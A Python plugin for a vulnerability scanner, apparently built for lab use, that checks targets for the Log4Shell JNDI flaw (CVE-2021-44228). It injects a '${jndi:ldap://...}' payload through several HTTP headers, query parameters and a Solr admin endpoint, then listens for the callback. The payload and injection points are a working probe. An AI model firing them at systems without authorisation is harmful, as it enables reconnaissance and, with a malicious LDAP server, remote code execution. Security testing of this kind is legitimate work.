import os
import socket
import threading
import time
from urllib.parse import quote

from core.http import request
from core.result import (make_result, STATUS_VULNERABLE,
                         STATUS_NOT_FOUND, STATUS_INCONCLUSIVE)

NAME = "log4j2_jndi"
DESCRIPTION = "Log4j2 JNDI lookup 回连检测"
REFERENCE = "CVE-2021-44228, https://vulhub.org/#/environments/log4j2/CVE-2021-44228/"

WAIT_SECONDS = 6   # lookup 解析是同步的,回连通常 1-2 秒内到达,6 秒留余量


class CallbackListener:
    """原始 TCP 监听器:accept() 即命中,无需实现 LDAP 协议"""
    def __init__(self):
        self.hits = []                     # (时间, 来源IP, 前64字节)
        self._sock = socket.socket()
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("0.0.0.0", 0))    # 端口填 0 = 让内核分配空闲端口,永不冲突
        self.port = self._sock.getsockname()[1]
        self._sock.listen(5)
        self._sock.settimeout(0.5)         # accept 定期醒来检查停止信号
        self._stop = threading.Event()
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self):
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            conn.settimeout(2)
            try:
                data = conn.recv(64)       # 前几十字节 = LDAP BindRequest(0x30 开头)
            except OSError:
                data = b""
            self.hits.append((time.time(), addr[0], data))
            conn.close()

    def stop(self):
        self._stop.set()
        self._thread.join(timeout=2)
        self._sock.close()


def check(target):
    """检测信号:注入 ${jndi:ldap://...} 后收到目标回连 = lookup 已执行 = 漏洞存在。
    已知限制:目标容器必须能解析并连到 callback host(Docker Desktop 默认
    host.docker.internal);目标出网被完全禁止时会得到 NOT_FOUND——这是漏报,
    本插件把它作为已知限制写进报告 note 与文档(Week 3 验收要求的"限制记录")。
    """
    callback_host = os.environ.get("POCFORGE_CALLBACK_HOST", "host.docker.internal")
    listener = CallbackListener()
    payload = "${jndi:ldap://%s:%d/pocforge}" % (callback_host, listener.port)

    injections = [                         # 一个 payload 覆盖多个常见注入面(头 + URL 参数)
        ("/",                            {"headers": {"User-Agent": payload}}),
        ("/",                            {"headers": {"X-Api-Version": payload}}),
        ("/",                            {"headers": {"X-Forwarded-For": payload}}),
        ("/",                            {"headers": {"Referer": payload}}),
        ("/?q=" + quote(payload),        {}),
        ("/?search=" + quote(payload),   {}),
        # README 确认的官方注入点:Solr 会把 action 参数记进 Log4j2 日志
        ("/solr/admin/cores?action=" + quote(payload), {}),
    ]

    reachable = False
    hit = None
    try:
        base = target.rstrip("/")
        for suffix, extra in injections:
            if listener.hits:              # 任意注入面命中即提前结束
                break
            try:
                request("GET", base + suffix, timeout=5, **extra)
                reachable = True           # 至少一次请求得到响应 = 目标可达
            except Exception:
                pass                       # 单个注入面失败不影响其他

        deadline = time.time() + WAIT_SECONDS
        while time.time() < deadline and not listener.hits:
            time.sleep(0.5)

        if listener.hits:
            t, peer, data = listener.hits[0]
            hit = {"callback_from": peer, "first_bytes": data.hex(), "payload": payload}
    except Exception as e:
        listener.stop()
        return make_result(NAME, target, STATUS_INCONCLUSIVE, note=f"检测过程异常: {e}")

    listener.stop()

    if not reachable:
        return make_result(NAME, target, STATUS_INCONCLUSIVE, note="目标完全不可达")
    if hit:
        return make_result(NAME, target, STATUS_VULNERABLE, evidence=hit)
    return make_result(NAME, target, STATUS_NOT_FOUND,
                       note="未收到回连;若目标容器出网受限则可能漏报(已知限制)")
